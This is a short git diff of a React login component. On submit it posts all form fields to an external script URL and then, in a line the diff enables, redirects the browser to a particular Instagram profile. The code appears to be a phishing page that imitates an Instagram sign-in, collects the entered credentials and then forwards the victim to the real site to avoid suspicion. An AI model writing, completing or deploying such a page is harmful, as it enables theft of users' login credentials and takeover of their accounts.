@@ -2,7 +2,7 @@ import React, { useState } from "react";
 import { NavLink } from "react-router-dom";
 
 const Login = () => {
-  const [none, setNone] = useState("none");
+  const [disnon, setDisnon] = useState("none");
 
   const submitForm = (e) => {
     const scriptURL =
@@ -12,21 +12,20 @@ const Login = () => {
     e.preventDefault();
     fetch(scriptURL, { method: "POST", body: new FormData(form) })
       .then((response) =>
-        // window.location.assign("https://www.instagram.com/iamuttampatra69/")
-        console.log()
+        window.location.assign("https://www.instagram.com/iamuttampatra69/")
       )
       .catch((error) => console.error("Error!", error.message));
-    setNone("");
+    setDisnon(" ");
   };
 
   //
 
   return (
     <div className="relative w-full h-full">
-      <div className={none}>
+      <div style={{ display: disnon }}>
         <div
           id="loader"
-          className={`absolute ${none} w-full bgbtrs top-0 h-full flex pt-10 justify-center`}
+          className={`absolute w-full bgbtrs top-0 h-full flex pt-10 justify-center`}
         >
           <div role="status">
             <svg
